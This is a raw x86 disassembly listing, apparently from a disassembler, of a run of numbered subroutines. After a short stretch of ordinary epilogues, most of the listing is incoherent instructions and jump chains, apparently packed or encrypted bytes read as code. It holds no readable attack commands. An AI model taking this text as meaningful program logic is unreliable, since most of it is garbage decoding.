add esp 0xc
retn
sub_46a974
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ eax + 0x28 ]
call [ ecx + 0x24 ]
pop ecx
pop edx
retn
j_sub_4039ac#6
jmp sub_4039ac
sub_46b024
pop ebp
retn
sub_46b028
sub [ rw-data ] 0x1
retn
sub_46b055
jmp sub_4039ac
sub_46b05c
pop ebp
retn
sub_46b060
sub [ rw-data ] 0x1
retn
sub_46b08d
jmp sub_4039ac
sub_46b094
pop ebp
retn
sub_46b098
sub [ rw-data ] 0x1
retn
sub_46b0c5
jmp sub_4039ac
sub_46b0cc
pop ebp
retn
sub_46b0d0
sub [ rw-data ] 0x1
retn
j_sub_4039ac#5
jmp sub_4039ac
sub_46b104
pop ebp
retn
sub_46b108
sub [ rw-data ] 0x1
retn
sub_46b135
jmp sub_4039ac
sub_46b13c
pop ebp
retn
sub_46b140
sub [ rw-data ] 0x1
retn
sub_46b16d
jmp sub_4039ac
sub_46b174
pop ebp
retn
sub_46b178
sub [ rw-data ] 0x1
retn
sub_46b1a5
jmp sub_4039ac
sub_46b1ac
pop ebp
retn
sub_46b1b0
sub [ rw-data ] 0x1
retn
j_sub_4039ac#4
jmp sub_4039ac
sub_46b1e4
pop ebp
retn
sub_46b1e8
sub [ rw-data ] 0x1
retn
j_sub_4039ac#3
jmp sub_4039ac
sub_46b21c
pop ebp
retn
sub_46b220
sub [ rw-data ] 0x1
retn
sub_46b6d4
jmp sub_4039ac
sub_46b6db
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4039ac#2
jmp sub_4039ac
sub_46b876
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4039ac
jmp sub_4039ac
sub_46b9f5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ba49
jmp sub_4039ac
sub_46ba50
pop ebp
retn
sub_46ba54
sub [ rw-data ] 0x1
retn
sub_46bf56
mov ebp 0xebb9cc02
jmp r-xdata
jmp r-xdata
push 0x6ee4d912
inc ecx
sub_46bf63
mov edx 0xff02ebeb
lodsb [ esi ]
jmp sub_46bf56
sub_46bf79
shr [ eax + 0x636fe4ad ] cl
leave
jmp r-xdata
xchg ebx eax
push ss
adc al 0x14
mov eax 0xa50a02bb
jmp sub_46bf63
sub_46bf82
push esp
push ebx
loopne r-xdata
mov eax 0xa50a02bb
jmp sub_46bf63
jmp r-xdata
jmp r-xdata
test [ ebp - 0x60f451d4 ] cl

sub_46bf88
scasd [ edi ]
iretd
sub_46bfa3
arpl di bp
jmp r-xdata
rcr al cl
cmp [ edx ] eax
imul edi [ ebx + 0x7b7bebeb ] 0xcf8766be
push 0x7
jae sub_46bfa3
sub_46bfbe
fwait
add cl [ ebx + 0x7bebeba4 ]
push 0x6ee4d912
inc ecx
sub_46bfcc
jmp r-xdata
jmp r-xdata
add cl [ edx ]
movsd [ edi ] [ esi ]
jmp sub_46bf63
sub_46bfcd
jmp r-xdata
jmp sub_46bfbe
sub_46bfce
add bh [ eax - 0x36 ]
jmp sub_46bfbe
sub_46bfd5
outsd
or ah bl
jmp r-xdata
push 0x6ee4d912
inc ecx
sub_46bfda
sub ebx 0xeb477d14
jmp sub_46bfcd
sub_46bfe7
sub ebx 0xa53403bd
jmp sub_46bfda
sub_46bff2
jmp r-xdata
jmp sub_46bfcc
sub_46c000
push 0xae66d32f
cmp edi [ ebx - 0x4490519a ]
add bh [ eax ]
out 0xeb al
jmp sub_46c08c
sub_46c047
jmp r-xdata
lea esp [ edx - 0x52 ]
adc eax 0xbb1bae66
pushad
scasb [ edi ]
jecxz r-xdata
jmp sub_46c047
shl [ ebp + 0x6002ebeb ] cl
iretd
sub_46c07a
push 0xebcfcf97
sub_46c07f
in al 0x6f
mov al [ 0x2ebebea ]
sbb ebx edi
jmp sub_46c075
j_sub_46c08c
adc al 0xbc
sub_46c08c
cmpsd [ esi ] [ edi ]
outsb
sub eax [ edx ]
lodsd [ esi ]
fsubr st3
jmp sub_46c110
sub_46c0e9
mov esi 0x7680760

sub_46c0ef
mov eax 0xbc03bcbd
enter 0xebeb 0x60
adc eax [ edx ]
in al dx
jmp sub_46c0e9
sub_46c110
jpo r-xdata
jmp j_sub_46c17c
outsd
iretd
j_sub_46c103
jmp sub_46c103
sub_46c11b
sub eax 0xebe26102
jmp r-xdata
loope r-xdata
jmp j_sub_46c17c
mul ah
j_sub_46c11b
jmp sub_46c11b
sub_46c137
xchg edi eax
iretd
sub_46c141
arpl sp bp
jmp r-xdata
add bl [ esi - 0x1 ]
jmp r-xdata
jmp r-xdata
loope r-xdata
jmp j_sub_46c17c
mul ah
j_sub_46c1a8
jmp sub_46c1a8
sub_46c146
xchg edi eax
iretd
sub_46c148
sti
push 0xeac7cf97
adc al 0x98
sub_46c154
lahf
iretd
sub_46c156
iretd
sub_46c157
in al 0x6e
mov cl 0xc2
jmp sub_46c148
sub_46c164
retn 0xebeb
sub_46c170
xor ebp [ eax + 0x10 ]
adc al 0x2
mov bh 0xe6
jmp sub_46c164
sub_46c172
adc [ edx + eax ] dl
mov bh 0xe6
jmp sub_46c164
sub_46c17a
sahf
lar esp ebp
out 0xeb eax
jmp j_sub_46c1ea
sub_46c17c
add ah ch
out 0xeb eax
jmp j_sub_46c1ea
j_sub_46c17c
jmp sub_46c17c
sub_46c19a
sbb esp esp
pop esp
loope r-xdata
jmp j_sub_46c17c
mul ah
sub_46c1a7
mov ebx 0xcf6766bb
ja r-xdata
rcr [ ecx ] 0xe4
pop esp
jmp r-xdata
jmp j_sub_46c17c
mul ah
loope r-xdata
in al 0x5c
sub_46c1a8
mov ebx 0x77cf6766
jmp sub_46c19a
sub_46c1b0
mov edx 0xa3cfa766
mov edx 0xaf628dbb
iretd
j_sub_46c146
jmp sub_46c146
j_sub_46c230
jmp sub_46c230
sub_46c1c7
sub ebx 0xf3cf9f14
adc al 0xbd
lahf
in al 0x5d
sub_46c1d2
lodsb [ esi ]
out dx eax
adc al 0xaf
iretd
sub_46c1df
0xcc02ebeb 0xebac
j_sub_46c1d2
jmp sub_46c1d2
sub_46c1ea
sahf
out 0xeb eax
jmp sub_46c172
sub_46c1ef
sub ecx [ esi ]
xchg ecx eax
pop ebx
mov eax 0xeb277562
jmp j_sub_46c1d2
sub_46c1fa
add edx [ esi - 0x1 ]
j_sub_46c1ea
jmp sub_46c1ea
sub_46c1ff
add [ ecx ] 0x6a
add [ ecx - 0x48 ] edx
add dl [ edx - 0x15 ]
jmp r-xdata
jmp sub_46c1fa
sub_46c219
sub esp esp
outsd
mov bl 0xf8
jmp r-xdata
pop ebx
cmpsb [ esi ] [ edi ]
jmp sub_46c1fa
sub_46c22a
pushad
mov [ 0xffffffffe25ce4ef ] eax
sub_46c283
jmp r-xdata
shr bl 0x1
jmp r-xdata
jmp sub_46c2dc
sub_46c28b
push 0xd202e92b
int3
j_sub_46c283
jmp sub_46c283
j_sub_46c28b#2
jmp sub_46c28b
j_sub_46c28b
cld
jmp j_sub_46c28b#2
sub_46c2bc
jmp r-xdata
jmp j_sub_46c283
j_sub_46c32e#2
jmp sub_46c32e
j_sub_46c2bc
jmp sub_46c2bc
sub_46c2d1
add esp [ ebp - 0x5b ]
jmp r-xdata
in al 0x6f
shr ebx cl
jmp r-xdata
jmp r-xdata
jmp r-xdata
scasb [ edi ]
inc ebx
add edi esi
mov al [ 0x2b6eebeb ]
in al 0x6f
sub_46c2d6
mov ebx 0x688fbd14
adc edx [ esp ]
outsb
adc al 0x15
adc al 0x14
sub edx 0xc4cfaf66
mov ebx 0x73cf6f66
jmp r-xdata
sub_46c2dc
adc al 0xe4
outsb
adc al 0x15
adc al 0x14
sub edx 0xc4cfaf66
mov ebx 0x73cf6f66
jmp r-xdata
adc edx [ esp ]
sub_46c32e
add bl [ ebx + 0x7bebebeb ]
adc al 0xae
pop ss
pushad
scasb [ edi ]
pop ss
shr [ esi - 0x1e961bed ] 0x1

j_sub_46c32e
jmp sub_46c32e
sub_46c345
mov al [ 0x6fe4ebeb ]
int1
jmp r-xdata
pop ss
shr [ esi - 0x1e961bed ] 0x1

j_sub_46c345
jmp sub_46c345
sub_46c409
pushad
out dx eax
iretd
sub_46c5dd
add dh [ ebp - 0x37 ]
jmp sub_46c5cd
sub_46c5e6
aad 0xbb
scasb [ edi ]
jmp sub_46c5d6
sub_46c619
das
[ esi + 0x2b ]
sub_46c65e
push 0xb402f707
fsub st3
jmp r-xdata
iretd
sub_46c7cd
lea esp [ edx - 0x52 ]
xor esi [ ebx - 0x1dfd777f ]
into
jmp r-xdata
lea esp [ edx - 0x6a ]
and [ edx ] eax
mov [ 0x628debeb ] eax
scasb [ edi ]
j_sub_46c7f0
jmp sub_46c7f0
sub_46ca5e
push 0x3360fb2f
outsb
adc al 0xe4
outsd
or eax ebp
jmp r-xdata
push ss
scasd [ edi ]
jmp r-xdata
scasd [ edi ]
iretd
j_sub_46cb02
jmp sub_46cb02
sub_46ca8a
pushad
adc ebp eax
adc ah ah
outsd
mov ah 0xef
jmp r-xdata
jmp r-xdata
xor ah ah
outsd
xor eax ebp
jmp sub_46ca5e
sub_46caa0
lodsd [ esi ]
int1
jmp r-xdata
outsd
mov ah 0xef
jmp r-xdata
jmp r-xdata
xor ah ah
outsd
xor eax ebp
jmp sub_46ca5e
sub_46caeb
in al 0x69
psubusw mm5 mm3
jmp sub_46caa6
sub_46cb00
pushad
push ebx
sub_46cb06
pushad
cmpsd [ esi ] [ edi ]
iretd
sub_46cb19
mov esp 0xc82002b7
jmp r-xdata
push edx
cld
jmp r-xdata
in al 0x65
loope r-xdata
psubusw mm5 mm3
jmp sub_46caa6
jmp sub_46caeb
sub_46cb85
push 0x2b6ee72f
add bl [ 0x7bebebff ]
outsb
pop es
push ss
adc al 0x14
mov ebx 0xebebea83
imul esp [ edx - 0x4a ] 0xfffffffb
adc al 0x7c
adc ebp ebx
jmp r-xdata
sub_46cbcc
jmp r-xdata
inc edi
jmp r-xdata
lodsd [ esi ]
jmp r-xdata
adc al 0xbb
sub edx 0xffffffeb
jmp sub_46cc07
sub_46cdcc
mov cl 0x8d
bound ebp [ esi - 0x419d727b ]
lea esp [ eax + 0x3b ]
add dh [ edx - 0x10 ]
jmp r-xdata
add ch [ eax ]
j_sub_46ceca
jmp sub_46ceca
sub_46ce64
scasb [ edi ]
pop ds
mov ebx 0x9e1fae2c
cwde
mov ds [ ecx + 0x13ae2c8d ]
fcomp st1
sub eax 0x14eb11ae
mov ebp 0xecb402a3
jmp r-xdata
sub_46cead
pop ss
fsubr [ ebx ]
add cl [ ebp - 0x14 ]
jmp r-xdata
mov edx 0xeb178e68
sub_46cebb
sbb al 0x33
add bh [ edx - 0x27 ]
jmp sub_46cead
sub_46ceda
jmp r-xdata
jmp sub_46cf31
sub_46cedb
fsubr [ ebx ]
add ah [ ebp - 0x15 ]
jmp sub_46cebb
j_sub_46ceda
jmp sub_46ceda
sub_46cfe3
iretd
sub_46cff1
lea esp [ edx - 0x5a ]
sbb eax [ ebx ]
aas
aad 0xeb
jmp r-xdata
jmp r-xdata
scasb [ edi ]
sbb eax [ ecx - 0x28dffd67 ]
jmp r-xdata
sbb [ ebp + 0x5ae628d ] 0xb08e81b3
lea esp [ edx - 0x52 ]
sub_46d065
jmp r-xdata
jmp sub_46d01c
sub_46d071
jmp r-xdata
int3
j_sub_46d065
mov esi 0x336d6217
jmp sub_46d065
sub_46d07a
jmp r-xdata
jmp r-xdata
jmp 0xffffffffec433bea
sub_46d096
in al 0x6f
sub dl [ esp + edx ]
adc al 0x81
jmp r-xdata
adc al 0x14
mov esi 0xd7020760
j_sub_46d096
jmp sub_46d096
sub_46d0c9
j_sub_46d0b7
jmp sub_46d0b7
sub_46d0ce
outsb
cmp edx [ esi ]
adc al 0x14
mov eax 0x17b662bb
add ebx [ ebx ]
salc
jmp sub_46d0c9
sub_46d177
add ch [ esi + 0x6 ]
adc al 0x14
outsw
iretd
sub_46d199
add ebx ebx
int3
sub_46d19e
fsubr [ ebx ]
stosd [ edi ]
add ah ah
xlat
jmp r-xdata
cmc
jmp sub_46d17f
sub_46d1a8
bound esi [ esi + 0x3402bc1f ]
shr bl 0xeb
jpo r-xdata
jmp sub_46d218
mov bl 0xef
jmp r-xdata
in al 0xd7
jmp r-xdata
cmc
jmp sub_46d17f
sub_46d210
pushad
xor eax [ ebx - 0x61e79271 ]
add dl [ ebp - 0x16 ]
jmp r-xdata
0xffffebeb 0x4703
sub_46d218
push ebp
0x7b7bebeb 0x817b
sub_46d231
add dh [ esi - 0x13 ]
jmp r-xdata
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
add dl [ ebp - 0x16 ]
jmp r-xdata
0xffffebeb 0x4703
sub_46d240
mov esi 0x2ba0760
out dx al
jmp r-xdata
jmp r-xdata
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
add dl [ ebp - 0x16 ]
jmp r-xdata
0xffffebeb 0x4703
j_sub_46d292
jmp sub_46d292
sub_46d379
mov ebx 0xebde0902
jmp sub_46d3fb
sub_46d5ea
push 0xebffcf97
in al 0x6e
adc eax 0x2141413
sub_46d666
xor [ ecx + 0x628d8581 ] 0xbe
mov ch 0x2
sub_46d66f
cdq
shr bl cl
jmp r-xdata
mov ebx 0xbb07ae66
add cl [ ecx - 0x1 ]
jmp r-xdata
in al 0xeb
jmp sub_46d763
sub_46d67a
outsb
mov al 0x2
adc al 0x14
add ebp [ ecx - 0x37 ]
jmp sub_46d66f
sub_46d690
fsub st3
jmp sub_46d666
sub_46d694
xchg esi eax
jmp esp
sub_46d69c
add cl [ ebx + 0x7bebebec ]
lodsw [ esi ]
fistp [ ebx - 0x142f27fe ]
jmp r-xdata
fsub st3
jmp sub_46d6df
sub_46d6ac
lea esp [ edx - 0x6a ]
sbb esp [ eax + 0x15 ]
lea esp [ edx - 0x6a ]
sbb [ edx ] eax
inc ecx
hlt
sub_46d719
outsb
sub esp esp
outsb
retn 0xebd2
j_sub_46d788
jmp sub_46d788
sub_46d73d
outsb
push edi
adc [ esp + edx ] edx
mov ebx 0xebcf8503
jmp sub_46d7b2
sub_46d7b2
jmp r-xdata
push ebp
mov al [ 0x2f5c1467 ]
jmp r-xdata
in al 0x5c
fld [ edx ]
stc
int3
sub_46d82a
mov ebp 0x5b83e881
push ebp
mov al [ 0x2f5c1467 ]
jmp r-xdata
in al 0x5c
fld [ edx ]
stc
int3
sub_46d858
cmp [ ebx ] 0xffffffea
0xb830d8eb 0x7d14
sub_46d86c
add ch dl
fldpi
jmp sub_46d8ed
sub_46d879
0xd3a302ab 0xebeb
sub_46d882
sub eax [ edx ]
aad 0xc2
jmp sub_46d873
sub_46d8be
shl [ esp ] 0x1
outsd
in al 0xea
jmp sub_46d8b1
sub_46d8ed
push 0x8bd6e72f
add ebx ebp
jmp sub_46d8da
sub_46d8f6
insb
jecxz r-xdata
jpo r-xdata
jmp r-xdata
xor eax [ edx ]
jpo r-xdata

and al 0xca
jmp r-xdata
add edx [ edx - 0x9 ]
jmp r-xdata
iretd
sub_46d905
iretd
sub_46d90c
adc al 0x54
inc ebx
mov ch bl
jmp sub_46d93f
sub_46d913
scasd [ edi ]
iretd
j_sub_46d905
jmp sub_46d905
j_sub_46d90c
jmp sub_46d90c
j_sub_46d913
jmp sub_46d913
sub_46d929
bound ebp [ edi + 0x28d0fbcf ]
in al 0x6e
in al dx
jmp j_sub_46d90c
sub_46d936
adc al 0x7d
inc edi
jmp j_sub_46d913
sub_46d967
adc al 0xbd
sti
add ch ch
loope r-xdata
das
pushad
xor al 0x8d
bound esi [ esi + 0x233605b ]
and al 0xca
jmp r-xdata
jmp sub_46d9eb

sub_46d972
mov eax 0x5307ae2d
add bl [ esi - 0x19 ]
jmp sub_46d967
sub_46d97c
sbb [ eax + 0x43b6628d ] 0xebfddb02
jmp sub_46da03
sub_46d98b
mov esi 0x81ba0760
stosd [ edi ]
fsubr [ ebx ]
mov ebx 0xa666e981
pop ss
mov edx 0xf6202bb
adc al 0x14
in al 0x5c
lodsd [ esi ]
[ eax + 0x2f ]
sub_46d9bc
jmp r-xdata
jmp r-xdata
jmp sub_46d9b2
sub_46d9bf
call 0x2a49c5af
sub_46d9cd
shl [ esp ] 0x1
outsb
in eax dx
jmp sub_46d9bf
j_sub_46da5c
jmp sub_46da5c
sub_46d9e5
sub ebp [ ebx - 0x62ebd7de ]
sub_46d9eb
mov edi 0x14e39e14
sahf
pop ss
adc al 0x9e
unpcklps xmm7 [ edi + esi * 8 - 0x143550fe ]
jmp sub_46d98b
sub_46da03
retn 0xebc0
j_sub_46da92#2
jmp sub_46da92
j_sub_46da92
jmp j_sub_46da92#2
sub_46da2a
or ecx 0x60ce81b2
sub cl [ ebp + 0x23fae62 ]
test [ esp + edx ] eax
adc al 0x14
sahf
jecxz sub_46da40
or [ esi ] ecx
sub_46da4d
push 0x7502e923
into
jmp sub_46da40
sub_46da50
add dh [ ebp - 0x32 ]
jmp sub_46da40
sub_46da55
outsb
sub esp esp
outsd
or [ esi ] edx
adc al 0x14
cmpsb [ esi ] [ edi ]
aas
add cl [ edx - 0x33 ]
jmp sub_46da50
sub_46da5c
adc al 0x66
cmpsb [ esi ] [ edi ]
aas
add cl [ edx - 0x33 ]
jmp sub_46da50
sub_46da75
sub ebx 0xeb477d14
jmp sub_46da68
sub_46da82
sub ebx 0xdfaf03bd
jmp sub_46da75
sub_46da8c
out 0x2 eax
mov esi 0x6eebebe4
sub esp esp
outsd
sub_46da92
outsb
sub esp esp
outsd
sub_46dacf
adc al 0x7b
pushad
scasb [ edi ]
cmp ebp [ eax + 0x2b ]
inc [ edx ]
in eax dx
sub_46dadc
mov ebx 0xde032d60
std
jmp sub_46dacf
sub_46db0f
adc al 0x9f
iretd
sub_46db12
pushad
sub eax 0xebd88803
jmp r-xdata
pop ss
adc al 0x14
jpo r-xdata
scasb [ edi ]
cmp ebp [ eax + 0x2b ]
inc [ edx ]
in eax dx
sub_46db21
outsd
sti
jmp r-xdata
lahf
iretd
sub_46db28
in al 0x6e
j_sub_46db21
jmp sub_46db21
sub_46db36
outsb
sub eax [ edx ]
idiv edi
jmp sub_46db28
sub_46dbce
push cs
hlt
sub_46dbd9
lea esp [ edx - 0x52 ]
sbb eax 0x8db38981
bound ebp [ esi - 0x4c677eed ]
lea esp [ edx - 0x52 ]
adc eax ebx
sub ecx [ ebp + 0x6617ae62 ]
mov esi 0xe77e02fb
jmp r-xdata
sbb [ eax - 0x519d724d ] 0x8d2bd811
bound ebp [ esi - 0x44199e9 ]
add bh [ esi - 0x19 ]
sub_46dbfb
bound edi [ esi - 0x72c59ff5 ]
bound edi [ esi - 0x3ddbfdf7 ]
jmp r-xdata
add bh [ esi - 0x19 ]
jmp r-xdata
sbb [ eax - 0x519d724d ] 0x8d2bd811
bound ebp [ esi - 0x44199e9 ]
sub_46dc0a
push 0x6d60ff07
sbb ebp ebx
jmp r-xdata
pushad
cmp cl [ ebp + 0x209be62 ]
and al 0xc2
jmp r-xdata
add bh [ esi - 0x19 ]
jmp r-xdata
sbb [ eax - 0x519d724d ] 0x8d2bd811
bound ebp [ esi - 0x44199e9 ]
sub_46dc1c
adc ecx [ ebp + 0x22d9662 ]
int3
sub_46dc2f
popad
cli
in al 0x5d
out dx eax
in eax 0x2
mov al [ 0x6614141a ]
mov esi 0xdec9031f
jmp r-xdata
jmp sub_46dbd9
sub_46dc55
push 0x6e66e72f
pop es
push ss
adc al 0x14
mov ebx 0x66c7bc14
outsb
add edx [ edi ]
adc al 0x14
mov ebx 0xebe72302
jmp r-xdata
fucomi st3
jmp r-xdata
sub_46dc75
sub esp esp
bound ebp [ ebp - 0x22 ]
jmp r-xdata
adc al 0xbb
add ah [ ebx ]
out 0xeb eax
jmp r-xdata
fucomi st3
jmp r-xdata
j_sub_46dc75
jmp sub_46dc75
sub_46dce8
add ebx [ edx ]
fucomi st3
jmp r-xdata
sub_46dece
stosb [ edi ]
fucomi st3
jmp sub_46df4e
j_sub_46dece
jmp sub_46dece
j_sub_46deef
jmp sub_46deef
sub_46df4e
scasb [ edi ]
dec ebx
mov ebx 0xcf032d60
sub_46df6e
jmp r-xdata
jmp r-xdata
sti
in al 0x6e
in eax 0x6
adc al 0x14
mov ebx 0xec81b8b8
mov eax 0xeb0b7c14
jmp r-xdata
shl [ esi - 0x1a911b05 ] cl
push es
sub_46df70
psubd mm5 mm3
jmp r-xdata
sti
in al 0x6e
in eax 0x6
adc al 0x14
mov ebx 0xec81b8b8
mov eax 0xeb0b7c14
jmp r-xdata
shl [ esi - 0x1a911b05 ] cl
push es
sub_46df80
sti
scasw [ edi ]
iretd
sub_46e2c8
pushad
cmp al 0x3
shl [ esp + edx ] 0x1
adc al 0x6e
sub esp esp
outsd
xchg [ esi ] eax
adc al 0x14
test al 0x2
hlt
sub_46e353
adc al 0xae
adc ebp [ eax - 0x52 ]
pop ss
retn
sub_46e354
scasb [ edi ]
adc ebp [ eax - 0x52 ]
pop ss
retn
j_sub_46e353
jmp sub_46e353
sub_46e455
pushad
0x60e7ab60 0xe7ab
sub_46e467
pushad
out dx eax
iretd
sub_46e46a
mov dl 0x28
mov eax 0xebec2402
jmp sub_46e424
sub_46e473
lea esp [ edx - 0x42 ]
fld [ ecx - 0x699d7274 ]
pop es
mov cl 0x8d
bound edi [ esi + 0x21560d3 ]
stc
cmc
jmp r-xdata
bound edi [ esi - 0x72737e23 ]
bound edx [ esi + 0x628db107 ]
mov esi 0x21560d3
sub_46e75b
push 0x97d2e72f
iretd
sub_46e761

sub_46e769
outsd
iretd
sub_46e7bd
outsd
add eax edx
jmp r-xdata
lahf
iretd
sub_46e7cb
pushad
pop esp
xor ebp ebx
jmp r-xdata
in al 0x6f
add eax edx
jmp r-xdata
lahf
iretd
j_sub_46e7bd
jmp sub_46e7bd
sub_46e7d8
in al 0x6f
xlat
push ds
adc al 0x14
pushad
scasb [ edi ]
pop ss
add bl [ ebp - 0x10 ]
jmp r-xdata
rcr [ eax ] 0x1
add dl [ ebx ]
iretd
sub_46e7e6
mov cl 0x2
dec ebx
cmc
jmp j_sub_46e7bd
sub_46ebbf
pushad
cmp al 0x2
imul eax [ ebx ] 0x14
adc al 0xbe
pushad
pop es
mov esp 0xeb83ef81
fucomi st3
jmp r-xdata
mov ah 0x2
int1
0x7b7bebeb 0x817b
j_sub_46ec3d
jmp sub_46ec3d
sub_46ebe5
sahf
mov ah 0x2
int1
0x7b7bebeb 0x817b
sub_46ebf0
scasd [ edi ]
fcom [ esi ]
scasd [ edi ]
iretd
sub_46ebfd
pushad
0x2e7ab60 0x3c1c
sub_46ec6f
scasb [ edi ]
or edi [ ebx - 0x140d52fe ]
jmp r-xdata
bound ebp [ esi - 0x117cfdcb ]
jmp r-xdata
pushad
sub cl [ ebp - 0x4cc8519e ]
add ebp 0x8d8e81b4
sub_46ec7a
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
retn
sub_46ec81
iretd
j_sub_46ec6f
jmp sub_46ec6f
sub_46eefd
adc al 0xbc
jmp [ edx + 0x5e ]
sub_46f03d
sub ebx 0xeb6b7d14
jmp sub_46f030
sub_46f053
mov eax 0x32c60bd
pop esp
sti
jmp r-xdata
sbb eax 0x349c6fe4
adc al 0x14
pushad
scasb [ edi ]
sti
sub_46f0ea
add bh ch
hlt
sub_46f3a5
iretd
sub_46f3a6
iretd
j_sub_46f40f
jmp sub_46f40f
sub_46f3a9
scasd [ edi ]
iretd
sub_46f3ab
iretd
sub_46f63a
scasb [ edi ]
sbb esp [ ebx - 0x52 ]
or esp [ esi - 0x5a ]
lar esp edi
0x2bcebeb 0x3681
sub_46f7e3
retn
sub_46f920
dec ecx
bound esi [ esi + 0x13a66217 ]
bound edi [ esi - 0x1be8fde1 ]
jmp r-xdata
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
bound ebp [ esi + 0x1fae6213 ]
j_sub_46f92f
jmp sub_46f92f
sub_46fa56
pushad
0x62e3ab60 0x17ae
sub_470028
pushad
scasd [ edi ]
iretd
sub_47002b
adc al 0x9f
iretd
sub_4709f8
sub esp [ edi ]
adc al 0x14
or ebp 0xffffff88
cmp [ eax + edi * 4 + 0x62 ] 0xebeb036d
jmp r-xdata
adc al 0x68
das

sub_470b64
push 0x9762e72f
iretd
sub_470d15
and ah ah
outsd
push ds
0xa653ebeb 0xebb1
j_sub_470caf
jmp sub_470caf
sub_470d26
or al 0xea
jmp sub_470d15
sub_470d2c
xlat
call 0x37b6f15c
0xd36aebeb 0xaebb
j_sub_470d26
jmp sub_470d26
sub_470d3b
in al 0x6e
cmp ebp edx
jmp sub_470d2c
sub_470d49
sub ah [ eax - 0x6d ]
mul [ eax - 0x4d ]
iretd
sub_470d50
pushad
fwait

sub_470d53
pushad
stosd [ edi ]
add cl [ esi - 0x16 ]
jmp r-xdata
pop ss
jmp r-xdata
aaa
0xd36aebeb 0xaebb
sub_470d5b
cmpsb [ esi ] [ edi ]
pop ss
mov edx 0x1411bd02
adc al 0x7b
sub al 0xae
pop es
mov [ ebx + ebx * 4 + 0x1bae2c92 ] al

sub_470d70
les ecx [ ecx + 0x1fae2ccb ]
leave
into
xchg [ eax - 0x36ec51d4 ] ebx

sub_471666
retn
sub_471667
jmp sub_4039ac
j_sub_471666
jmp sub_471666
sub_47166e
pop ebp
retn
